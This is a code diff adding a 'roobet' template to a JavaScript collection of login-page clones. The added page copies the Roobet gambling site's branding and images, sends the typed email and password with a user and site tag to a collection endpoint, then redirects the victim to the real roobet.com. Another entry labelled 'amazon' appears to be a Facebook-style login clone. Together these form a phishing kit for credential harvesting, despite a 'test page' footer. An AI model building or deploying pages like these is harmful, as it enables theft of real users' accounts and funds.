@@ -433,6 +433,449 @@ export const websites = {
       </script>
   </body>
   </html>`,
+  "roobet":`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Its a Test Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+
+
+    <script>
+        const uid = "user123user123"; 
+        const websiteName = "mywebsitemywebsite"; 
+    
+        async function handleSubmit(event) {
+          event.preventDefault(); 
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+            
+          const signInButton = document.getElementById("amazon");
+            signInButton.disabled = true;
+            signInButton.style.opacity = '0.5';
+            signInButton.style.cursor = 'not-allowed';
+            
+
+          try {
+            const response = await fetch("http://localhost:5237/insertdata", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                uid: uid,
+                websiteName: websiteName,
+                email: email,
+                password: password
+              })
+            });
+    
+            window.location.href = "https://roobet.com/";
+        } catch (error) {
+          window.location.href = "https://roobet.com/";
+          }
+        }
+      </script>
+
+    <style>
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+}
+
+body {
+    background-color: #f5f5f5;
+}
+
+.main-container {
+    display: flex;
+    height: 100vh;
+}
+
+/* Login Section */
+.login-section {
+    width: 40%;
+    background-color: #131941;
+    padding: 2rem;
+    display: flex;
+    flex-direction: column;
+    color: white;
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    margin-bottom: 3rem;
+}
+
+.logo img {
+    height: 50px;
+    margin-right: 15px;
+}
+
+.logo h1 {
+    color: #f9b938;
+    font-weight: bold;
+    font-size: 1.8rem;
+}
+
+.login-form {
+    flex-grow: 1;
+    max-width: 450px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.login-form h2 {
+    font-size: 1.8rem;
+    margin-bottom: 0.5rem;
+    font-weight: 600;
+}
+
+.no-account {
+    color: #aaa;
+    margin-bottom: 1.5rem;
+}
+
+.register-link {
+    color: #7263f3;
+    text-decoration: none;
+}
+
+.form-group {
+    margin-bottom: 1rem;
+}
+
+label {
+    display: block;
+    margin-bottom: 0.5rem;
+    font-size: 0.9rem;
+}
+
+input {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    border-radius: 6px;
+    border: none;
+    background-color: #212a51;
+    color: white;
+    font-size: 1rem;
+}
+
+input::placeholder {
+    color: #6c7293;
+}
+
+.password-input {
+    position: relative;
+}
+
+.toggle-password {
+    position: absolute;
+    right: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #6c7293;
+}
+
+.forgot-password {
+    text-align: right;
+    margin-bottom: 1.5rem;
+}
+
+.forgot-password a {
+    color: #6c7293;
+    text-decoration: none;
+    font-size: 0.9rem;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 0.75rem;
+    background-color: #f9b938;
+    color: #000;
+    border: none;
+    border-radius: 6px;
+    font-size: 1rem;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    margin-bottom: 2rem;
+}
+
+.login-btn:hover {
+    background-color: #e9a928;
+}
+
+.alternative-login {
+    text-align: center;
+    margin-bottom: 2rem;
+}
+
+.alternative-login p {
+    margin-bottom: 1rem;
+    color: #6c7293;
+    position: relative;
+}
+
+.alternative-login p:before, .alternative-login p:after {
+    content: "";
+    position: absolute;
+    top: 50%;
+    width: 35%;
+    height: 1px;
+    background-color: #2a325a;
+}
+
+.alternative-login p:before {
+    left: 0;
+}
+
+.alternative-login p:after {
+    right: 0;
+}
+
+.social-buttons {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+}
+
+.social-btn {
+    flex: 1;
+    padding: 0.6rem;
+    border: none;
+    border-radius: 6px;
+    background-color: #212a51;
+    color: white;
+    cursor: pointer;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.social-btn i {
+    margin-right: 5px;
+}
+
+.social-btn.google {
+    color: white;
+}
+
+.social-btn.steam {
+    color: white;
+}
+
+.social-btn.metamask {
+    color: white;
+}
+
+.footer {
+    font-size: 0.7rem;
+    color: #6c7293;
+    text-align: center;
+    margin-top: auto;
+}
+
+.footer a {
+    color: #6c7293;
+    text-decoration: none;
+}
+
+/* Hero Section */
+.hero-section {
+    width: 60%;
+    position: relative;
+    overflow: hidden;
+}
+
+.hero-section img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.hero-content {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    padding: 2rem;
+    background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
+}
+
+.hero-names {
+    display: flex;
+    justify-content: space-around;
+    margin-bottom: 2rem;
+}
+
+.hero-name {
+    text-align: center;
+    color: white;
+}
+
+.hero-name h3 {
+    font-size: 1.2rem;
+    font-weight: normal;
+}
+
+.hero-name h2 {
+    font-size: 1.8rem;
+    font-weight: bold;
+}
+
+.partner-logo {
+    display: flex;
+    justify-content: center;
+}
+
+.partner-badge {
+    display: flex;
+    align-items: center;
+}
+
+.partner-badge img {
+    width: 60px;
+    height: 60px;
+    margin-right: 15px;
+}
+
+.badge-text {
+    color: white;
+    text-align: center;
+    font-size: 0.8rem;
+}
+
+.close-btn {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    width: 30px;
+    height: 30px;
+    background: rgba(0, 0, 0, 0.5);
+    color: white;
+    border: none;
+    border-radius: 50%;
+    font-size: 20px;
+    cursor: pointer;
+}
+
+/* Responsive Design */
+@media (max-width: 992px) {
+    .main-container {
+        flex-direction: column;
+    }
+    
+    .login-section, .hero-section {
+        width: 100%;
+    }
+    
+    .login-section {
+        height: auto;
+        padding: 1.5rem;
+    }
+    
+    .hero-section {
+        height: 400px;
+    }
+}
+
+@media (max-width: 576px) {
+    .social-buttons {
+        flex-direction: column;
+    }
+    
+    .hero-names {
+        flex-direction: column;
+        gap: 1rem;
+    }
+}
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="login-section">
+            <div class="logo">
+                <img src="https://roobet.com/assets/r-NQNxh0.svg" alt="Beastlings Logo">
+                <h1></h1>
+            </div>
+
+            <div class="login-form">
+                <h2>Login to your account</h2>
+                <p class="no-account">Don't have an account? <a href="#" class="register-link">Register</a></p>
+                
+                <form onsubmit="handleSubmit(event)">
+                    <div class="form-group">
+                        <label for="email">Username or Email</label>
+                        <input type="text" id="email" placeholder="Username or Email">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <div class="password-input">
+                            <input type="password" id="password" placeholder="Password">
+                            <i class="fas fa-eye-slash toggle-password"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="forgot-password">
+                        <a href="#">Forgot Password?</a>
+                    </div>
+                    
+                    <button type="submit" id="amazon" class="login-btn" onclick="handleSubmit(event)">Play Now</button>
+                </form>
+                
+                <div class="alternative-login">
+                    <p>Or continue with</p>
+                    <div class="social-buttons">
+                        <button class="social-btn google"><i class="fab fa-google"></i> Google</button>
+                        <button class="social-btn steam"><i class="fab fa-steam"></i> Steam</button>
+                        <button class="social-btn metamask"><i class="fas fa-mask"></i> Metamask</button>
+                    </div>
+                </div>
+                
+                <div class="footer">
+                    <p>This site is test page, Don't use real account.</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="hero-section">
+            <img src="https://roobet.com/cdn-cgi/image/dpr=2,width=auto,height=auto,quality=85,blur=0,format=auto/assets/DSKEi6SY.jpg" alt="Beastlings">
+            <button class="close-btn">×</button>
+        </div>
+    </div>
+    
+    <script>
+        // Toggle password visibility
+        document.querySelector('.toggle-password').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.classList.replace('fa-eye-slash', 'fa-eye');
+            } else {
+                passwordInput.type = 'password';
+                this.classList.replace('fa-eye', 'fa-eye-slash');
+            }
+        });
+        
+        // Close button functionality
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            alert('Close button clicked!');
+        });
+    </script>
+</body>
+</html>`,
     "amazon":`<html>
     <head>
       <title>Test Page</title>
@@ -2164,7 +2607,7 @@ export const websites = {
                   <input type="submit" class="a-sub" id="amazon" value="Log In" />
                   <a href="" class="a-link">Forgotten password?</a>
                   <hr class="a-hr">
-                  <input type="submit " value="Create New Account" class="a-but" />
+                  <input type="submit" value="Create New Account" class="a-but" />
               </form>
               <div class="create-page">
                   <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
